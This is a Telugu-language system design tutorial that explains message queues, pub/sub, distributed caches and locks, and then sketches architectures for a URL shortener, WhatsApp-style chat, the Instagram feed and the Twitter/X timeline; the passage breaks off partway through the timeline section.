సాఫ్ట్‌వేర్ ఆర్కిటెక్చర్‌లో **Pub/Sub (Publish/Subscribe)** మరియు **Message Queue** అనేవి రెండు అత్యంత ముఖ్యమైన "Async Communication" పద్ధతులు. ఒక సర్వీస్ నుండి మరొక సర్వీస్‌కు డేటాను పంపేటప్పుడు ఈ రెండింటిని వాడతాం, కానీ వీటి పనితీరులో చిన్న చిన్న వ్యత్యాసాలు ఉన్నాయి.

మన స్టైల్‌లో సింపుల్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Message Queue (ఒకరికొకరు - Point-to-Point)

- **The Core Concept:** ఒక **Producer** (పంపేవాడు) మెసేజ్‌ని ఒక క్యూలో పడతాడు, ఆ మెసేజ్‌ని ఒకే ఒక్క **Consumer** (తీసుకునేవాడు) తీసుకుంటాడు. అది తీసుకున్నాక క్యూ నుండి ఆ మెసేజ్ డిలీట్ అయిపోతుంది.
- **The Analogy:** ఒక కస్టమర్ కేర్ కాల్ సెంటర్. మీరు (Producer) కాల్ చేస్తే, చాలా మంది ఏజెంట్లలో ఎవరో ఒకరు (Consumer) ఆ కాల్‌ను పిక్ చేస్తారు. మీరు చేసిన ఒక కాల్‌ను అందరు ఏజెంట్లు వినరు కదా! ఒక్కరే వింటారు.
- **Why it's needed:** టాస్క్‌ను ప్రాసెస్ చేయడానికి ఒకే ఒక్క సర్వర్ ఉంటే, మెసేజ్ క్యూ బెస్ట్. ఇది "టూ-డూ లిస్ట్" (To-do list) లాంటిది.
- **Tools:** **RabbitMQ**, **AWS SQS** (Simple Queue Service).

---

## 2. Pub/Sub (ఒకరి నుండి అందరికీ - One-to-Many)

- **The Core Concept:** ఒక **Publisher** ఒక ఈవెంట్‌ను పంపుతాడు, దానికి **సబ్‌స్క్రయిబ్ (Subscribe)** చేసుకున్న ఎందరు ఉన్నా సరే, అందరికీ ఆ మెసేజ్ వెళ్తుంది.
- **The Analogy:** యూట్యూబ్ ఛానల్. ఒక వీడియో (మెసేజ్) అప్‌లోడ్ చేస్తే, దానికి సబ్‌స్క్రయిబ్ చేసుకున్న లక్షల మందికి నోటిఫికేషన్ వెళ్తుంది. ప్రతి ఒక్కరూ ఆ వీడియోను చూడగలరు.
- **Why it's needed:** ఒకే డేటాతో పది రకాల పనులు చేయాల్సి వచ్చినప్పుడు (ఉదా: యూజర్ సైన్ అప్ అయితే—వెల్కమ్ ఈమెయిల్ పంపాలి, ఎస్ఎంఎస్ పంపాలి, డేటా అనలిటిక్స్ లో సేవ్ చేయాలి). అప్పుడు సైన్-అప్ ఈవెంట్‌ను పబ్లిష్ చేస్తాం, ఈ మూడు కన్స్యూమర్లు దాన్ని తీసుకుని తమ పనులు చేసుకుంటాయి.
- **Tools:** **Apache Kafka**, **Redis Pub/Sub**, **Google Pub/Sub**.

---

## 📌 క్విక్ కంపారిజన్ (తేడా ఏంటి?):

| ఫీచర్             | Message Queue                              | Pub/Sub                                 |
| ----------------- | ------------------------------------------ | --------------------------------------- |
| **మెసేజ్ పంపిణీ** | ఒక్కరికి మాత్రమే (1 to 1).                 | అందరికీ (1 to Many).                    |
| **నిర్వహణ**       | మెసేజ్ కన్స్యూమ్ అవ్వగానే డిలీట్ అవుతుంది. | మెసేజ్ ఎందరైనా కన్స్యూమ్ చేయవచ్చు.      |
| **ఉద్దేశ్యం**     | టాస్క్ డిస్ట్రిబ్యూషన్ (Load Balancing).   | ఈవెంట్ బ్రాడ్‌కాస్టింగ్ (Broadcasting). |

---

### 📌 ఆర్కిటెక్చరల్ టిప్:

- మీ అప్లికేషన్ లో ఒక భారీ టాస్క్ ఉంది, దాన్ని ఏదో ఒక సర్వర్ చేస్తే చాలు అనుకుంటే — **Message Queue** వాడండి.
- మీ అప్లికేషన్ లో ఒక ఈవెంట్ జరిగితే, దానికి సంబంధం ఉన్న 5 సర్వీసులు తమ పనిని తాము చేసుకోవాలి అనుకుంటే — **Pub/Sub** వాడండి.

---

సిస్టమ్ డిజైన్ (System Design) లో ఒకే సర్వర్‌ని దాటి, వెయ్యి సర్వర్లు ఉన్నప్పుడు డేటాను వేగంగా ఎలా ఉంచాలి? మరియు ఒకే పనిని అందరూ కలిసి ఒకేసారి చేయకుండా ఎలా ఆపాలి? అనే సవాళ్లకు సమాధానాలే **Distributed Cache** మరియు **Distributed Lock**.

వీటిని కూడా మన స్టైల్‌లో సింపుల్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Distributed Cache (ఎక్కడ ఉన్నా ఒకే డేటా)

- **The Core Concept:** మన దగ్గర 10 సర్వర్లు ఉన్నాయి. ప్రతి సర్వర్‌లో విడిగా లోకల్ క్యాషీ పెడితే, సర్వర్-1 లో ఒక డేటా ఉంటుంది, సర్వర్-2 లో ఉండదు. యూజర్లు ఏ సర్వర్‌కి వెళ్తే ఆ డేటా మారుతుంటుంది. దీన్ని పోగొట్టడానికి, అన్ని సర్వర్లకు కామన్‌గా ఒక **సెంట్రల్ క్యాషీ సర్వర్** ని పెట్టడమే **Distributed Cache**.
- **Why it's needed:** అప్లికేషన్ స్కేల్ అయినప్పుడు, డేటాబేస్ మీద భారం పడకుండా ఉండటానికి ఇది అవసరం. అన్ని సర్వర్లు కలిసి ఒకే క్యాషీ సర్వర్‌ని వాడుకుంటాయి.
- **How it works:**
- యాప్ సర్వర్లు అన్నీ **Redis** లేదా **Memcached** క్లస్టర్‌ని కనెక్ట్ అవుతాయి.
- ఒక సర్వర్ డేటాని అప్‌డేట్ చేస్తే, అది క్యాషీలో అప్‌డేట్ అవుతుంది, మిగిలిన 9 సర్వర్లకు కూడా అదే లేటెస్ట్ డేటా కనిపిస్తుంది.

- **Tools:** Redis Cluster, Memcached.

---

## 2. Distributed Lock (ట్రాఫిక్ జామ్ కాకుండా)

- **The Core Concept:** ఒకే డేటాను లేదా ఒకే రిసోర్స్‌ను ఇద్దరు వ్యక్తులు ఒకేసారి మార్చడానికి ట్రై చేస్తే సిస్టమ్ పాడవుతుంది (Race Condition). ఒక సర్వర్ ఆ పనిని చేస్తున్నప్పుడు, మిగిలిన సర్వర్లు వెయిట్ చేసేలా ఒక **డిజిటల్ తాళం (Lock)** వేయడమే Distributed Lock.
- **Why it's needed:** ఉదాహరణకు, ఒక బ్యాంక్ అకౌంట్ లో 1000 రూపాయలే ఉన్నాయి. ఇద్దరు యూజర్లు వేర్వేరు సర్వర్ల నుండి ఒకే సెకనుకి 1000 రూపాయలు విత్ డ్రా చేస్తే ఏమవుతుంది? రెండు సర్వర్లు 1000 బ్యాలెన్స్ ఉందని చెక్ చేసి, రెండింటినీ అప్రూవ్ చేస్తాయి. ఇక్కడ లాక్ లేకపోతే బ్యాంక్ మునిగిపోతుంది.
- **How it works:** \* ఒక పనిని మొదలుపెట్టే ముందు, ఒక సెంట్రల్ ప్లేస్ (Redis) లో ఒక **'Lock'** క్రియేట్ చేయాలి.
- ఆ లాక్ సక్సెస్ అయితేనే పని మొదలుపెట్టాలి.
- పని అయిపోయాక లాక్ తీసేయాలి (Release).
- మిగిలిన సర్వర్లు లాక్ ఉన్నంత వరకు వెయిట్ చేయాలి.

- **Tools:** Redis (Redlock algorithm), Zookeeper, etcd.

---

### 📌 క్విక్ సమ్మరీ (తేడా ఏంటి?):

| ఫీచర్        | Distributed Cache                                  | Distributed Lock                                         |
| ------------ | -------------------------------------------------- | -------------------------------------------------------- |
| **లక్ష్యం**  | పర్ఫార్మెన్స్ (రీడ్ స్పీడ్) పెంచడం.                | డేటా కన్సిస్టెన్సీ (డబుల్ ఎంట్రీ కాకుండా) కాపాడటం.       |
| **డేటా**     | ఫ్రీక్వెంట్ గా వాడే డేటా (User Profile, Products). | కేవలం ఒక చిన్న ఫ్లాగ్ (Locked/Unlocked status).          |
| **వ్యాప్తి** | ఇది రీడ్-హెవీ అప్లికేషన్స్ కి బెస్ట్.              | ఇది మల్టిపుల్ ప్రాసెస్ లని సింక్రోనైజ్ చేయడానికి బెస్ట్. |

---

### 📌 ఆర్కిటెక్చరల్ టిప్:

- మీ అప్లికేషన్ వేగంగా ఉండాలంటే **Redis** ని Distributed Cache గా వాడండి.
- మీ అప్లికేషన్ లో డేటా కరప్షన్ అవ్వకుండా ఉండాలంటే **Redis/Zookeeper** తో Distributed Lock ని ఇంప్లిమెంట్ చేయండి.

---

# 17: High-Level System Design Problems

---

## URL Shortener

**URL Shortener (Bitly లాంటి సిస్టమ్)** అనేది చాలా ఇంట్రెస్టింగ్ ప్రాబ్లం. దీనిని డిజైన్ చేసేటప్పుడు మనం స్కేలబిలిటీ మరియు పర్ఫార్మెన్స్ మీద దృష్టి పెట్టాలి.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* యూజర్ ఒక లాంగ్ URL ఇస్తే, అది షార్ట్ URL గా మారాలి.
- షార్ట్ URL మీద క్లిక్ చేస్తే ఒరిజినల్ URL కి రీడైరెక్ట్ అవ్వాలి.
- యూజర్ కస్టమ్ URL ని కూడా ఎంచుకోవచ్చు (Optionally).

- **Non-Functional:**
- హైలీ అవైలబుల్ (సర్వర్ ఎప్పుడూ అందుబాటులో ఉండాలి).
- రీడైరెక్షన్ చాలా వేగంగా (latency < 100ms) జరగాలి.
- షార్ట్ URL లు ఇతరులకు ఊహించలేనంతగా (Unpredictable) ఉండాలి.

---

### 2. Back-of-the-envelope estimation (అంచనాలు)

- రోజుకు 1 మిలియన్ కొత్త URL లు జనరేట్ అవుతున్నాయి అనుకుందాం.
- 5 ఏళ్లలో 1.8 బిలియన్ URL లు ఉంటాయి.
- ఒక షార్ట్ URL ని 7 క్యారెక్టర్ల పొడవు ఉంచితే, `62^7` కాంబినేషన్లు వస్తాయి (సుమారు 3.5 ట్రిలియన్లు). ఇది సరిపోతుంది.

---

### 3. Database Design (డేటాబేస్)

- **SQL (PostgreSQL/MySQL)** బెస్ట్ ఎందుకంటే డేటా రిలేషనల్ (Long URL <-> Short URL).
- **Table Schema:**
- `id` (Primary Key)
- `short_url` (Index, Unique)
- `long_url`
- `created_at`

---

### 4. High-Level Design (ఆర్కిటెక్చర్)

1. **Client** -> **Load Balancer** -> **API Server**.
2. **Generation:** యూజర్ లాంగ్ URL ఇవ్వగానే, సర్వర్ ఒక చిన్న కోడ్‌ని (Hash) జనరేట్ చేసి డేటాబేస్ లో సేవ్ చేస్తుంది.
3. **Redirection:** క్లిక్ చేయగానే, `GET /{short_url}` ద్వారా డేటాబేస్ ని చెక్ చేస్తుంది.

---

### 5. Deep Dive (అడ్వాన్స్‌డ్ మెకానిజమ్స్)

#### A. URL జనరేషన్ ఎలా?

- **Hashing (MD5/SHA):** URL ని హాష్ చేసి మొదటి 7 క్యారెక్టర్లు తీసుకుంటాం. కానీ ఇక్కడ **Collision** (ఒకే హాష్ రెండు URL లకు రావడం) సమస్య ఉంటుంది.
- **Base62 Encoding (Best Approach):** ఒక ఆటో-ఇంక్రిమెంట్ ఐడి (1, 2, 3...) తీసుకుని, దాన్ని Base62 (0-9, a-z, A-Z) లోకి మారుస్తాం. ఇది చాలా ఫాస్ట్ మరియు సురక్షితం.

#### B. వేగాన్ని పెంచడానికి (Performance)

- **Caching:** అత్యధికంగా క్లిక్ అయ్యే URL లను **Redis** లో స్టోర్ చేయాలి.
- **Read Replicas:** డేటాబేస్ మీద రీడ్ భారం తగ్గించడానికి మాస్టర్-స్లేవ్ రిప్లికేషన్ వాడాలి.

#### C. రిడైరెక్షన్ రకం

- **HTTP 301 (Permanent Redirect):** ఇది బ్రౌజర్ లో క్యాష్ అవుతుంది. యూజర్ మళ్ళీ అదే లింక్ క్లిక్ చేస్తే బ్రౌజర్ డైరెక్ట్ గా ఒరిజినల్ సైట్ కి వెళ్తుంది. మన సర్వర్ కి కూడా రావాల్సిన పని లేదు! (పర్ఫార్మెన్స్ కి ఇది బెస్ట్).

---

### 6. Summary Flow (ఆర్కిటెక్చర్ సమ్మరీ)

1. **User** -> **Load Balancer**.
2. **API Service** -> Base62 కీ ని జనరేట్ చేస్తుంది.
3. **Primary DB** -> కీని సేవ్ చేస్తుంది.
4. **Redis Cache** -> రీడ్ ఆపరేషన్స్ కోసం రెడీగా ఉంటుంది.

**Bottleneck:** ఒకవేళ డేటాబేస్ లో `auto-increment` ఐడిలు అయిపోతే లేదా స్లో అయితే, ఒక **Distributed Key Generation Service** ని ముందుగానే వాడాలి (ఉదా: Snowflake ID).

---

## WhatsApp

**WhatsApp** లాంటి మెసేజింగ్ యాప్‌ని డిజైన్ చేయడం అనేది **Distributed Systems** లో ఒక అద్భుతమైన ఛాలెంజ్. దీనిని డిజైన్ చేసేటప్పుడు మనం "రియల్-టైమ్ కమ్యూనికేషన్" మరియు "మెసేజ్ డెలివరీ గ్యారెంటీ" మీద దృష్టి పెట్టాలి.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* వన్-టు-వన్ మెసేజింగ్ (Chatting).
- మెసేజ్ స్టేటస్ (Sent, Delivered, Read - Double Ticks).
- ఆన్‌లైన్/ఆఫ్‌లైన్ స్టేటస్ (Last Seen).
- గ్రూప్ చాట్స్, మీడియా షేరింగ్.

- **Non-Functional:**
- **Low Latency:** మెసేజ్ వెంటనే వెళ్ళాలి.
- **High Availability & Reliability:** మెసేజ్ అస్సలు మిస్ అవ్వకూడదు (At-least-once delivery).
- **Scalability:** కోట్లాది మంది యూజర్లు ఒకేసారి మెసేజ్లు పంపుతారు.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **WebSocket Connection:** మనం REST API వాడకూడదు (ఎందుకంటే HTTP ప్రతిసారీ ఓపెన్/క్లోజ్ అవ్వడం స్లో). యూజర్‌కి సర్వర్ కి మధ్య ఒక పర్మనెంట్ కనెక్షన్ కోసం **WebSockets** వాడాలి.
2. **Gateway Service:** యూజర్ ఆన్‌లైన్‌లో ఉన్నాడా? ఏ సర్వర్‌కి కనెక్ట్ అయ్యాడు? అని చూసే "Connection Manager" సర్వర్.
3. **Chat Service:** మెసేజ్‌లను ప్రాసెస్ చేసే మెయిన్ సర్వీస్.
4. **Message Store:** మెసేజ్‌లను శాశ్వతంగా దాచుకోవడానికి (NoSQL - **Cassandra** బెస్ట్ ఎందుకంటే ఇది భారీ స్థాయిలో మెసేజ్‌లను ఫాస్ట్‌గా రైట్ చేయగలదు).

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. మెసేజ్ ఎలా వెళ్తుంది? (The Flow)

1. **User A** -> **WebSocket** -> **Gateway** -> **Chat Service**.
2. **Chat Service**:

- డేటాబేస్ లో మెసేజ్ సేవ్ చేస్తుంది.
- **User B** ఆన్‌లైన్‌లో ఉన్నాడా? అని చూడటానికి **Presence Service** ని అడుగుతుంది.
- యూజర్ B ఆన్‌లైన్‌లో ఉంటే, అతని WebSocket ద్వారా మెసేజ్ డెలివరీ చేస్తుంది.
- లేకపోతే, **Push Notification Service** (FCM/APNS) కి పంపిస్తుంది.

#### B. మెసేజ్ స్టేటస్ (Double Ticks) ఎలా?

- **Sent:** సర్వర్‌కి మెసేజ్ చేరినప్పుడు.
- **Delivered:** యూజర్ B మొబైల్‌కి మెసేజ్ చేరినప్పుడు (యూజర్ B మొబైల్ నుండి సర్వర్‌కి ఒక **ACK - Acknowledgement** రావాలి).
- **Read:** యూజర్ B చాట్ ఓపెన్ చేసినప్పుడు.

#### C. లాస్ట్ సీన్ (Last Seen)

- యూజర్ ఆన్‌లైన్‌లో ఉన్నప్పుడు **Redis** లో ఒక కీ (key) ని `Online` అని సెట్ చేస్తాం.
- యూజర్ ఆఫ్‌లైన్ అవ్వగానే, ఆ కీ లో లాస్ట్ టైమ్‌స్టాంప్ ని అప్‌డేట్ చేస్తాం. మిలియన్ల మంది యూజర్లు ఉన్నప్పుడు, ఇది డిస్ట్రిబ్యూటెడ్ క్యాషీ (Redis) లో మాత్రమే సాధ్యం.

---

### 4. Database Schema (NoSQL ఎందుకు?)

- మెసేజ్ డేటా రిలేషనల్ కాదు, కాబట్టి **Cassandra (Wide Column Store)** వాడతాము.
- `Chat_Table` (Partition Key: `chat_id`, Clustering Key: `timestamp`) - దీనివల్ల పాత మెసేజ్ లు కావాలంటే టైమ్ వారీగా చాలా వేగంగా తెచ్చుకోవచ్చు.

---

### 5. Bottlenecks & Solutions

1. **Group Chat:** ఒకే మెసేజ్ వేల మందికి వెళ్ళాలి. దీనికోసం **Pub/Sub** మోడల్ వాడాలి. గ్రూప్ ఐడి ని ఒక ఛానల్ లాగా భావించి, ఆ గ్రూప్ లో ఉన్న అందరు యూజర్లు ఆ ఛానల్ కి సబ్‌స్క్రయిబ్ అవుతారు.
2. **Media Sharing:** ఫొటోలు/వీడియోలు నేరుగా చాట్ సర్వర్ ద్వారా పంపకూడదు.

- ముందు వాటిని **S3 (Object Storage)** లో అప్‌లోడ్ చేసి, దాని URL ని మాత్రమే మెసేజ్‌లో పంపాలి.

---

### Summary Architecture:

- **Connection Layer:** WebSockets (Nginx/Gateway).
- **Messaging Layer:** Chat Service + Kafka (మెసేజ్ క్యూ కోసం).
- **Storage Layer:** Cassandra (Messages) + Redis (Presence/Caching).
- **Notification Layer:** Firebase/Apple Push.

---

## Chat Application

వాట్సాప్ లాంటి మెసేజింగ్ యాప్స్ గురించి మనం డిస్కస్ చేసుకున్నాం కదా, ఒక సాధారణ "Real-time Chat Application"ని ఎలా బిల్డ్ చేయాలో ఇప్పుడు ఒక స్ట్రక్చర్డ్ వ్యూలో చూద్దాం. ఇది స్కేలబుల్ మరియు ఫాస్ట్‌గా ఉండాలంటే ఈ క్రింది ఆర్కిటెక్చర్ అవసరం.

---

### 1. కోర్ కాంపోనెంట్స్ (Core Components)

- **Client:** వెబ్ లేదా మొబైల్ యాప్.
- **WebSocket Server:** రియల్-టైమ్ కమ్యూనికేషన్ కోసం. (HTTP/REST కాదు).
- **Gateway/Load Balancer:** ట్రాఫిక్‌ను బ్యాలెన్స్ చేయడానికి.
- **Redis:** ఆన్‌లైన్/ఆఫ్‌లైన్ స్టేటస్ మరియు క్యాషింగ్ కోసం.
- **Message Broker (Kafka/RabbitMQ):** మెసేజ్ పంపే ప్రాసెస్ స్లో అవ్వకుండా ఉండటానికి.
- **Database (NoSQL):** మెసేజ్ హిస్టరీ స్టోర్ చేయడానికి.

---

### 2. ఆర్కిటెక్చర్ ఫ్లో (Step-by-Step)

1. **Connection:** క్లయింట్ సర్వర్‌తో **WebSocket** కనెక్షన్ ఎస్టాబ్లిష్ చేస్తుంది. ఈ కనెక్షన్ ఎప్పుడూ ఓపెన్‌గానే ఉంటుంది.
2. **Authentication:** కనెక్షన్ అయ్యేటప్పుడే `Auth Token` ని గేట్‌వే లెవెల్‌లో చెక్ చేస్తాం.
3. **Presence:** యూజర్ కనెక్ట్ అవ్వగానే `Redis` లో `User_ID: Server_ID` అని మ్యాప్ చేస్తాం. దీనివల్ల ఏ యూజర్ ఏ సర్వర్‌కి కనెక్ట్ అయ్యాడో మనకు తెలుస్తుంది.
4. **Sending Message:**

- యూజర్ మెసేజ్ పంపగానే అది **Message Service** కి వెళ్తుంది.
- సర్వీస్ వెంటనే మెసేజ్‌ని `Cassandra` లేదా `DynamoDB` లో సేవ్ చేస్తుంది.
- ఆ మెసేజ్‌ని **Message Broker (Kafka)** కి పుష్ చేస్తుంది.

5. **Receiving:**

- మెసేజ్ బ్రోకర్ నుండి అవతలి యూజర్ కనెక్ట్ అయి ఉన్న సర్వర్, ఆ మెసేజ్‌ను తీసుకుని, యూజర్ యొక్క ఓపెన్ WebSocket ద్వారా డెలివర్ చేస్తుంది.

---

### 3. ముఖ్యమైన టెక్నికల్ డెసిషన్స్ (Design Decisions)

- **Why WebSockets?**
  HTTP లో ప్రతి మెసేజ్ కోసం కొత్త కనెక్షన్ ఓపెన్ అవ్వాలి (Handshake), ఇది చాలా స్లో. WebSocket లో ఒకసారి కనెక్షన్ ఓపెన్ అయితే, ఇద్దరు యూజర్లు మెసేజ్లు పంపుకుంటూనే ఉండవచ్చు.
- **Why Cassandra?**
  మెసేజింగ్ యాప్‌లో రైట్ ఆపరేషన్స్ (Write) విపరీతంగా ఉంటాయి. Cassandra "Write-heavy" పనులకు బెస్ట్. అలాగే డేటా స్కేల్ అయినప్పుడు అది చాలా పవర్‌ఫుల్.
- **Handling Offline Users:**
  యూజర్ ఆఫ్‌లైన్‌లో ఉంటే, மெసేజ్ ని మెసేజ్ క్యూ (Queue) లో ఉంచి, **Push Notification Service (FCM)** ద్వారా యూజర్‌కి అలర్ట్ పంపుతాం.

---

### 4. ఛాలెంజెస్ (Challenges & Solutions)

- **Message Ordering:** యూజర్ 1, 2, 3 అని మెసేజ్లు పంపితే, అవతలి వారికి కూడా 1, 2, 3 క్రమంలోనే రావాలి. దీనికోసం `Timestamp` + `Sequence Number` వాడాలి.
- **Scalability:** ఒక యూజర్ ఒక సర్వర్‌కి, మరో యూజర్ ఇంకో సర్వర్‌కి కనెక్ట్ అయి ఉంటే? ఇక్కడే మనం **Pub/Sub** మోడల్ వాడాలి. సర్వర్లు ఒకదానితో ఒకటి మాట్లాడుకోవడానికి Redis Pub/Sub లేదా Kafka ని వాడుతాం.
- **Chat History:** పాత మెసేజ్లు కావాలంటే `Pagination` వాడాలి. యూజర్ స్క్రోల్ చేస్తున్నప్పుడు సర్వర్ నుండి 20 మెసేజ్లు మాత్రమే లోడ్ అయ్యేలా ప్లాన్ చేస్తాం.

---

### 5. సిస్టమ్ డిజైన్ సమ్మరీ (Quick View)

```text
[User A] --(WS)--> [Load Balancer] --> [Chat Server] --> [Kafka] --> [Chat Server] --(WS)--> [User B]
                                           |                 |
                                      [Database]       [Push Notification]

```

---

## Instagram Feed

**Instagram Feed** ని డిజైన్ చేయడం అనేది చాలా పెద్ద సవాలు. ఎందుకంటే ఇందులో కేవలం మెసేజ్‌లు మాత్రమే కాదు, హై-క్వాలిటీ ఫోటోలు, వీడియోలు, మరియు లక్షల మంది సెలబ్రిటీల ఫాలోవర్స్ ఉంటారు. దీనిని డిజైన్ చేసేటప్పుడు మనం **"Read-heavy"** అప్లికేషన్ ని ఎలా హ్యాండిల్ చేయాలో చూడాలి.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* యూజర్ తన ఫాలో అయ్యే వ్యక్తుల పోస్టులను (Feed) చూడాలి.
- పోస్ట్ చేయడం (Photos/Videos).
- లైక్స్, కామెంట్స్, మరియు షేరింగ్.

- **Non-Functional:**
- **Low Latency:** యాప్ ఓపెన్ చేయగానే ఫీడ్ వెంటనే కనిపించాలి.
- **High Availability:** ఫీడ్ ఎప్పుడూ అందుబాటులో ఉండాలి.
- **Scalability:** మిలియన్ల మంది యూజర్లు ఒకేసారి ఫీడ్ ని రిఫ్రెష్ చేస్తారు.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Feed Service:** యూజర్ ఫీడ్ ని కంపోజ్ చేయడానికి.
2. **Post Service:** కొత్త పోస్టులను క్రియేట్ చేయడానికి.
3. **Graph Service:** ఫాలోయింగ్/ఫాలోవర్స్ రిలేషన్ షిప్ ని స్టోర్ చేయడానికి.
4. **Media Service:** ఫోటో/వీడియోలను **Object Storage (S3)** లో సేవ్ చేయడానికి.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. ఫీడ్ ఎలా జనరేట్ అవుతుంది? (Fan-out Pattern)

ఇన్స్టాగ్రామ్ ఫీడ్ కి రెండు పద్ధతులు ఉన్నాయి:

- **Pull Model (On-demand):** యూజర్ తన ఫీడ్ ఓపెన్ చేసినప్పుడు, సర్వర్ అతను ఎవరిని ఫాలో అవుతున్నాడో చూసి, వారి పోస్టులను రియల్-టైమ్‌లో తెస్తుంది.
- _సమస్య:_ ఇది సెలబ్రిటీలకు (10M ఫాలోవర్స్) సరిగ్గా పనిచేయదు, ఎందుకంటే ప్రతి ఒక్కరు రిఫ్రెష్ చేసినప్పుడు సెలబ్రిటీ పోస్ట్ కోసం సెర్చ్ చేయడం వల్ల సిస్టమ్ స్లో అవుతుంది.

- **Push Model (Pre-computed):** యూజర్ ఏదైనా పోస్ట్ చేయగానే, ఆ పోస్ట్‌ని అతని ఫాలోవర్లందరి **"Feed Cache"** లోకి పుష్ చేస్తుంది.
- _లాభం:_ యూజర్ ఫీడ్ ఓపెన్ చేయగానే, ఆల్రెడీ రెడీగా ఉన్న క్యాషీలో నుండి డేటా వస్తుంది. ఇది చాలా ఫాస్ట్.

**ఇన్స్టాగ్రామ్ హైబ్రిడ్ మోడల్ వాడుతుంది:** సాధారణ యూజర్లకు **Push Model**, సెలబ్రిటీలకు **Pull Model** (సెలబ్రిటీ పోస్ట్ ని క్యాషీలో పెట్టకుండా, యూజర్ ఓపెన్ చేసినప్పుడు ఆ పోస్ట్‌ని ఫెచ్ చేయడం).

#### B. డేటాబేస్ స్ట్రాటజీ

- **Post Table:** పోస్ట్ ఐడి, యూజర్ ఐడి, మీడియా URL.
- **Graph Database (Neo4j):** ఫాలోయింగ్ రిలేషన్ షిప్స్ కోసం. (User A -> Follows -> User B).

#### C. క్యాషింగ్ (Redis)

- **Feed Cache:** ప్రతి యూజర్‌కి ఒక లిస్ట్ (Redis List) ఉంటుంది. ఫాలో అయ్యే వారి పోస్ట్ ఐడిలు ఇందులో ఉంటాయి.
- **Media Cache:** CDN (CloudFront/Akamai) ద్వారా ఫోటోలను ప్రపంచవ్యాప్తంగా లోడ్ చేస్తాం.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Post Creation:** యూజర్ ఫోటో అప్‌లోడ్ చేస్తాడు -> **Post Service** అదిని S3 లో పెడుతుంది -> పోస్ట్ ఐడిని **Fan-out Service** కి పంపుతుంది.
2. **Fan-out Service:** యూజర్ ఫాలోవర్లందరినీ ఐడెంటిఫై చేసి, వారి **Feed Cache (Redis)** లో ఈ కొత్త పోస్ట్ ఐడిని యాడ్ చేస్తుంది.
3. **Feed Retrieval:** యూజర్ యాప్ ఓపెన్ చేయగానే -> **Feed Service** -> **Redis (Feed Cache)** నుండి పోస్ట్ ఐడిలు తెచ్చుకుంటుంది -> ఆ ఐడిలతో **Post Service** ద్వారా పోస్ట్ డీటెయిల్స్ తెచ్చుకుంటుంది -> ఫీడ్ చూపిస్తుంది.

---

### 5. Bottlenecks & Solutions

1. **Celebrity Post Spike:** ఒక పెద్ద సెలబ్రిటీ పోస్ట్ పెట్టినప్పుడు మిలియన్ల మందికి పుష్ చేయడం చాలా కష్టం. దీనికోసం "Asynchronous Fan-out" వాడతాం (మెసేజ్ క్యూ ద్వారా నెమ్మదిగా ఫాలోవర్ల ఫీడ్ ని అప్‌డేట్ చేస్తాం).
2. **Data Consistency:** కొత్త పోస్ట్ కనిపిస్తుందా లేదా? అనేది క్యాషీని ఎప్పటికప్పుడు అప్‌డేట్ చేయడం ద్వారా పరిష్కరిస్తాం.

---

### Summary Architecture:

- **Storage:** S3 (Media) + SQL (Metadata) + NoSQL (Cassandra/DynamoDB - Posts).
- **Speed:** Redis (Feed Cache) + CDN (Images/Videos).
- **Scale:** Kafka (For Fan-out processing).

---

## Twitter/X Timeline

Twitter/X Timeline (దీన్నే **"Home Timeline"** అంటారు) డిజైన్ చేయడం అనేది సిస్టమ్ డిజైన్‌లో అత్యంత సంక్లిష్టమైన సమస్యలలో ఒకటి. ఇది Instagram Feed లాగే ఉన్నప్పటికీ, ఇక్కడ **Real-time** అప్‌డేట్స్ మరియు **High Frequency** (సెకనుకు లక్షల రిక్వెస్టులు) చాలా కీలకం.

దీనిని మనం ఎలా డిజైన్ చేయాలో చూద్దాం.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* ట్వీట్స్ చేయడం (Post a Tweet).
- టైమ్‌లైన్ చూడటం (Get Home Timeline - ఫాలో అయ్యే వారి ట్వీట్స్).
- రీ-ట్వీట్స్, లైక్స్ మరియు రిప్లైలు.

- **Non-Functional:**
- **Latency:** యూజర్ ట్వీట్ చేయగానే, ఫాలోవర్లకు కొన్ని సెకన్లలో కనిపించాలి (Low latency).
- **Availability:** టైమ్‌లైన్ ఎప్పుడూ లోడ్ అవ్వాలి.
- **Scalability:** రోజుకు బిలియన్ల కొద్దీ ట్వీట్స్, కోట్లాది మంది యూజర్లు.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Tweet Service:** ట్వీట్స్‌ను ప్రాసెస్ చేయడానికి.
2. **Timeline Service:** ఫాలోవర్ల టైమ్‌లైన్‌లను ప్రిపేర్ చేయడానికి.
3. **Graph Service:** ఫాలోవర్లు/ఫాలోయింగ్ లిస్టులు (Social Graph) నిర్వహించడానికి.
4. **Media Service:** ఇమేజెస్/వీడియోల కోసం.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Fan-out (Timeline Construction)

ఇక్కడ కూడా మనం Instagram లో చెప్పుకున్నట్టే **Push vs Pull** మోడల్స్ వాడతాము:

- **Push Model (Fan-out on Write):**
- ఒక యూజర్ ట్వీట్ చేయగానే, ఆ ట్వీట్ ఐడిని ఆ యూజర్ ఫాలోవర్లందరి **Redis (Timeline Cache)** లోకి పుష్ చేస్తాం.
- యూజర్ యాప్ ఓపెన్ చేయగానే, ఆ క్యాషీలో ఉన్న ట్వీట్స్ ని వెంటనే చూపించేస్తుంది. ఇది యూజర్‌కి చాలా ఫాస్ట్ (Read లో చాలా తక్కువ టైమ్).

- **Pull Model (Fan-out on Load):**
- యూజర్ ట్వీట్ చేసినప్పుడు ఏమీ చేయము.
- ఎవరైనా ఫీడ్ ఓపెన్ చేసినప్పుడు, అతను ఫాలో అయ్యే వ్యక్తులందరి ఐడిలను తీసుకుని, వారి లేటెస్ట్ ట్వీట్స్ ని డేటాబేస్ నుండి తెస్తాం.
